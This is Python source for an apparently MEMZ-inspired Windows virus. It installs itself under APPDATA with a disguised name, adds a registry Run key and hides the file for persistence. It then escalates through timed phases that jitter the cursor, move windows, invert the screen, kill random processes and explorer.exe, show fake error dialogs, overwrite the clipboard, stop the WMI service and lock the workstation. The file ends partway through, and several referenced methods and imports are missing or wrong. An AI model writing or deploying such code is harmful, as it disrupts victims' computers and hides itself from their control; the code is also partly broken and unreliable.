import os
import sys
import time
import random
import subprocess
import threading
import winreg
import psutil
import ctypes
from datetime import datetime

class MEMZInspiredVirus:
    def __init__(self):
        self.active = True
        self.phase = 1
        self.start_time = time.time()
        self.current_dir = os.path.dirname(os.path.abspath(__file__))
        self.phase_file = os.path.join(self.current_dir, "current_phase.txt")
        self.install_path = os.path.join(os.environ["APPDATA"], "WindowsSystem", "system_maintenance.exe")
        self.registry_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        self.registry_name = "WindowsSystemMaintenance"
        
        # Write initial phase to file
        self.update_phase_file()
        
        # Ensure we're running in the background
        self.setup_persistence()
        
    def update_phase_file(self):
        """Update the phase file with current phase information"""
        try:
            with open(self.phase_file, 'w') as f:
                f.write(f"Current Phase: {self.phase}\n")
                f.write(f"Started: {datetime.fromtimestamp(self.start_time).strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Current Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        except:
            pass
    
    def setup_persistence(self):
        """Install malware to run on system startup"""
        try:
            # Create directory if it doesn't exist
            if not os.path.exists(os.path.dirname(self.install_path)):
                os.makedirs(os.path.dirname(self.install_path))
            
            # Copy self to persistent location
            if not os.path.exists(self.install_path):
                shutil.copyfile(sys.executable, self.install_path)
            
            # Add to registry startup
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.registry_key, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, self.registry_name, 0, winreg.REG_SZ, self.install_path)
            winreg.CloseKey(key)
            
            # Hide the file
            subprocess.run(f'attrib +h "{self.install_path}"', shell=True)
            
        except Exception as e:
            pass  # Silently continue if persistence fails
    
    def check_phase(self):
        """Determine current phase based on elapsed time"""
        elapsed = time.time() - self.start_time
        
        if elapsed < 1200:  # 10-20 minutes
            self.phase = 1
        elif elapsed < 3600:  # 20-60 minutes
            self.phase = 2
        elif elapsed < 7200:  # 1-2 hours
            self.phase = 3
        elif elapsed < 18000:  # 2-5 hours
            self.phase = 4
        else:  # 5+ hours
            self.phase = 5
        
        # Update phase file if phase changed
        self.update_phase_file()
    
    def phase_1_activity(self):
        """Phase 1: Subtle visual effects and cursor anomalies"""
        if random.random() < 0.1:  # 10% chance
            try:
                # Slight cursor jitter
                for _ in range(5):
                    ctypes.windll.user32.SetCursorPos(
                        ctypes.windll.user32.GetCursorPos()[0] + random.randint(-5, 5),
                        ctypes.windll.user32.GetCursorPos()[1] + random.randint(-5, 5)
                    )
                    time.sleep(0.05)
                
                # Randomly change cursor for a moment
                ctypes.windll.user32.SetSystemCursor(ctypes.windll.user32.LoadCursor(0, 32512), 32512)
                time.sleep(0.5)
                ctypes.windll.user32.SystemParametersInfo(0x0057, 0, None, 0x0002)
                
            except:
                pass
    
    def phase_2_activity(self):
        """Phase 2: Window manipulation and screen distortion"""
        if random.random() < 0.2:  # 20% chance
            try:
                # Random window manipulation
                windows = []
                def enum_windows_proc(hwnd, lParam):
                    if ctypes.windll.user32.IsWindowVisible(hwnd) and ctypes.windll.user32.GetWindowTextLength(hwnd) > 0:
                        windows.append(hwnd)
                    return True
                
                ctypes.windll.user32.EnumWindows(ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_long)(enum_windows_proc), 0)
                
                if windows:
                    # Random window effects
                    window = random.choice(windows)
                    effect = random.choice(['move', 'resize', 'flash'])
                    
                    if effect == 'move':
                        for _ in range(10):
                            ctypes.windll.user32.SetWindowPos(
                                window, 0,
                                random.randint(0, 1000), random.randint(0, 800),
                                0, 0, 0x0001
                            )
                            time.sleep(0.1)
                    
                    elif effect == 'resize':
                        ctypes.windll.user32.SetWindowPos(
                            window, 0, 0, 0,
                            random.randint(200, 800), random.randint(200, 600),
                            0x0002
                        )
                    
                    elif effect == 'flash':
                        for _ in range(5):
                            ctypes.windll.user32.FlashWindow(window, True)
                            time.sleep(0.2)
                
                # Screen color inversion briefly
                ctypes.windll.gdi32.InvertRect(ctypes.windll.user32.GetDC(0), (0, 0, 1920, 1080))
                time.sleep(0.1)
                ctypes.windll.gdi32.InvertRect(ctypes.windll.user32.GetDC(0), (0, 0, 1920, 1080))
                
            except:
                pass
    
    def phase_3_activity(self):
        """Phase 3: Application interference and message boxes"""
        if random.random() < 0.3:  # 30% chance
            try:
                # Kill and restart applications
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        proc_name = proc.info['name'].lower()
                        if random.random() < 0.3 and ('explorer' not in proc_name):
                            proc.terminate()
                            time.sleep(random.randint(1, 3))
                            
                            # Restart if it's a common application
                            if 'chrome' in proc_name:
                                subprocess.Popen(['start', 'chrome'], shell=True)
                            elif 'notepad' in proc_name:
                                subprocess.Popen(['notepad'], shell=True)
                            break
                    except:
                        pass
                
                # Random error messages
                if random.random() < 0.5:
                    error_messages = [
                        "System error: Memory allocation failed",
                        "Warning: Registry corruption detected",
                        "Critical error: Driver initialization failed",
                        "Alert: System resources depleted",
                        "Error: Unable to access system files"
                    ]
                    
                    ctypes.windll.user32.MessageBoxW(
                        0, 
                        random.choice(error_messages), 
                        "Windows Error", 
                        0x10 | 0x0
                    )
                
            except:
                pass
    
    def phase_4_activity(self):
        """Phase 4: System instability and visual chaos"""
        if random.random() < 0.4:  # 40% chance
            try:
                # More aggressive visual effects
                effects = [
                    self.screen_tunnel_effect,
                    self.matrix_rain_effect,
                    self.screen_shake_effect,
                    self.color_flash_effect
                ]
                
                # Start random effect in background
                threading.Thread(target=random.choice(effects)).start()
                
                # Kill critical processes occasionally
                if random.random() < 0.2:
                    subprocess.run("taskkill /f /im explorer.exe", shell=True)
                    time.sleep(random.randint(5, 15))
                    subprocess.run("start explorer.exe", shell=True)
                
                # Corrupt clipboard
                if random.random() < 0.3:
                    ctypes.windll.user32.OpenClipboard(None)
                    ctypes.windll.user32.EmptyClipboard()
                    ctypes.windll.user32.SetClipboardText("ERROR: CLIPBOARD CORRUPTED")
                    ctypes.windll.user32.CloseClipboard()
                
            except:
                pass
    
    def phase_5_activity(self):
        """Phase 5: Maximum disruption - MEMZ-like behavior"""
        if random.random() < 0.6:  # 60% chance
            try:
                # Multiple disruptive activities
                effects = [
                    self.bouncing_icon_effect,
                    self.error_spam_effect,
                    self.bootloop_preparation,
                    self.final_screen_effect
                ]
                
                # Start multiple effects
                for _ in range(random.randint(2, 4)):
                    threading.Thread(target=random.choice(effects)).start()
                
                # Force restart of critical services
                if random.random() < 0.3:
                    subprocess.run("net stop winmgmt /y", shell=True)
                    time.sleep(10)
                    subprocess.run("net start winmgmt", shell=True)
                
                # Lock workstation
                if random.random() < 0.2:
                    subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)
                
            except:
                pass